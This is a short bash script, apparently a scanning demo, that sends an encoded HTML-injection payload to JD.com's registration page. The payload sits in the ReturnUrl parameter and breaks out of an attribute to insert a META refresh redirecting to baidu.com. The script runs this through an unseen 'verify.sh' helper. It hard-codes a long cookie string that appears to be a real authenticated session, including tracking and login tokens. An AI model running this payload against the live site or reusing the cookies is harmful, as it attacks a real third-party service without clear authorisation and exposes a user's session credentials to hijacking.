#!/bin/bash

# scan_demo.sh - Demonstration of using verify.sh for vulnerability scanning

# Target URL with payload
URL="https://reg.jd.com/reg/person?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F%3Fcu%3Dtrue%22%3E%3CMETA%20HTTP-EQUIV%3D%27refresh%27%20CONTENT%3D%270%3Burl%3Dhttps%3A%2F%2Fbaidu.com%27%20%3E"

# Cookie (from original execute_scan.py)
COOKIE="jdd69fo72b8lfeoe=ZPHZVBKIHJSD64H62B3FHDJDVPUR2S5WZD3U2INSJOJCISQMUEY45NZBVTO5TX3BZXKFOC7MTNUPXXHA2VXIRZ2VVM; 3AB9D23F7A4B3CSS=jdd03KPWXPD4HVTPU5LVNSF27PX7RHGIUYPIUHC3EQZOGKN5XL6HN3W6YJ3NXHNU77J73L5X5YWQYORUIKGKCXR27DCJ2KUAAAAMZTFZAWCYAAAAADF7SI52S4ZGFK4X; __jda=235085212.17592128445552114483919.1759212845.1759212845.1759215886.2; __jdu=17592128445552114483919; TrackID=1vChX31Mzqx6uYBabV5exeKs0uV5uIrMyCus0JWnKz6fes7lEC-hXzu3dPgQE8pjh6KAbiqaXF4lqMeVL5QsJ51AXBJVokC1ZRBS8cgnKRM0cJZfmq_9Pf4F6EVdEYPavLg6wgy0gPmGE3o6gtiYrew; light_key=AASBKE7rOxgWQziEhC_QY6yaOeJma-THnq8YEovTC2TFoXZ_9-RKkrjA_9NVNlqdznRBedHp6fNH-UrsGraPVvW2-yUliA; pinId=CEl2sPvQllwFpZV_1WBuBkBYG3kXqE1e; _base_=YKH2KDFHMOZBLCUV7NSRBWQUJPBI7JIMU5R3EFJ5UDHJ5LCU7R2NILKK5UJ6GLA2RGYT464UKXAI4Z6HPCTN4UQM3WHVQ4ENFP57OC65FJUPPUPZ5UNXRSOO7UPRZ545SCF555UOYV4EAPZGFCGTWBTL2VZELA6E4S4L2GLWBLTAIW5N6ZGEONMNNA5DQRDPVL52KNRE2QP7O37CEXBCP7OC3YG4MEKLVTSGRNB3AY2NNXFWQMKIYDTHIPC2W5H7NITWKU3OUXCGOXVN3BJNZ5SBHNPGJLU3IIOAKGMN6OBEN52BXQETXAXYHPG3IHO62RTL5AR7SOIEGNTAKJW5HP3GJTJBQLTN3MQVWCQDLDW4DCXW2VS6CWUJ576C6KRU; 3AB9D23F7A4B3C9B=KPWXPD4HVTPU5LVNSF27PX7RHGIUYPIUHC3EQZOGKN5XL6HN3W6YJ3NXHNU77J73L5X5YWQYORUIKGKCXR27DCJ2KU; jd.erp.lang=zh_CN"

USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0"

echo "Starting Scan Demo..."
echo "Target: $URL"
echo "---------------------------------------------------"

# Execute verify.sh
# Ensure verify.sh is executable and in the same directory
if [ ! -f "./verify.sh" ]; then
    echo "Error: verify.sh not found!"
    exit 1
fi

./verify.sh -u "$URL" -c "$COOKIE" -A "$USER_AGENT"
